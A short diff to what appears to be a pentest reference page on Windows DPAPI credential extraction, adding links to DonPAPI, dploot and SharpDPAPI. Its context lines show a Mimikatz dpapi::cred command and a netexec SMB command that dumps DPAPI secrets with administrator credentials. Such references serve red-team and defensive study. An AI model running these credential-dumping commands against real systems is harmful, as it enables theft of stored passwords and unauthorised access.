@@ -81,3 +81,9 @@ Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\yuyudhn\AppData\Roaming\Micr
 netexec smb target.local -u Administrator -p Password123 --local-auth --dpapi
 ```
 {% endcode %}
+
+## Other tools
+
+* [**DonPAPI**](https://github.com/login-securite/DonPAPI)
+* [**dploot**](https://github.com/zblurx/dploot)
+* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
